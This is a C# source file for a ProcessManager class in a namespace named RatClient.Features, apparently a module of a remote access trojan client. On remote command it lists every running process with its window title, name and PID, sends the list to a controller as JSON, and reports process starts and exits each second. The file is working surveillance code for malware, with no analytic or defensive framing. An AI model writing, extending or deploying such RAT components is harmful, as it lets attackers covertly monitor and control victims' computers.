using System;
using System.Linq;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Diagnostics;
using System.Collections.Generic;

namespace RatClient.Features
{
    class ProcessManager
    {
        #region Variables
        private readonly Action<object> SendJson;
        private bool isListening = false;
        private List<int> initialProcessIds = new List<int>();
        private Dictionary<int, Process> initialProcesses = new Dictionary<int, Process>();
        #endregion

        #region Constructor
        public ProcessManager(Action<object> sendJson)
        {
            this.SendJson = sendJson;

            Program.MessageReceived += HandleMessage;
        }
        #endregion

        #region Methods
        public void GetProcesses()
        {
            var processes = Process.GetProcesses().Select(p => new
            {
                DisplayName = p.MainWindowTitle,
                ProcessName = p.ProcessName,
                Pid = p.Id
            }).ToList();

            initialProcessIds = processes.Select(p => p.Pid).ToList();
            initialProcesses = Process.GetProcesses().ToDictionary(p => p.Id);

            var jsonSerializer = new System.Web.Script.Serialization.JavaScriptSerializer();
            string processesJson = jsonSerializer.Serialize(processes);
            SendJson(new { type = "pm_list", data = processesJson });
        }

        public void StartListening()
        {
            isListening = true;
            Task.Run(() => ListenForProcessChanges()).ConfigureAwait(false);
        }

        public void StopListening()
        {
            isListening = false;
        }

        private void ListenForProcessChanges()
        {
            var existingProcesses = new Dictionary<int, Process>(initialProcesses);

            while (isListening)
            {
                var currentProcesses = Process.GetProcesses().ToDictionary(p => p.Id);

                var addedProcesses = currentProcesses.Values.Except(existingProcesses.Values, new ProcessComparer()).ToList();
                var removedProcesses = existingProcesses.Values.Except(currentProcesses.Values, new ProcessComparer()).ToList();

                foreach (var process in addedProcesses)
                {
                    if (!initialProcessIds.Contains(process.Id))
                    {
                        try
                        {
                            SendJson(new
                            {
                                type = "pm_start",
                                DisplayName = process.MainWindowTitle,
                                ProcessName = process.ProcessName,
                                PID = process.Id
                            });
                            initialProcessIds.Add(process.Id);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error sending start process notification: {ex.Message}");
                        }
                    }
                }

                foreach (var process in removedProcesses)
                {
                    if (initialProcessIds.Contains(process.Id))
                    {
                        try
                        {
                            SendJson(new
                            {
                                type = "pm_kill",
                                DisplayName = process.MainWindowTitle,
                                ProcessName = process.ProcessName,
                                PID = process.Id
                            });
                            initialProcessIds.Remove(process.Id);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error sending kill process notification: {ex.Message}");
                        }
                    }
                }

                existingProcesses = new Dictionary<int, Process>(currentProcesses);
                Task.Delay(1000).Wait();
            }
        }
        #endregion

        #region Event Handlers
        private void HandleMessage(dynamic message)
        {
            if (message["type"] == "pm_listen")
            {
                GetProcesses();
                StartListening();
            }
            else if (message["type"] == "pm_stop")
            {
                StopListening();
            }
        }
        #endregion

        private class ProcessComparer : IEqualityComparer<Process>
        {
            public bool Equals(Process x, Process y)
            {
                return x.Id == y.Id;
            }

            public int GetHashCode(Process obj)
            {
                return obj.Id.GetHashCode();
            }
        }
    }
}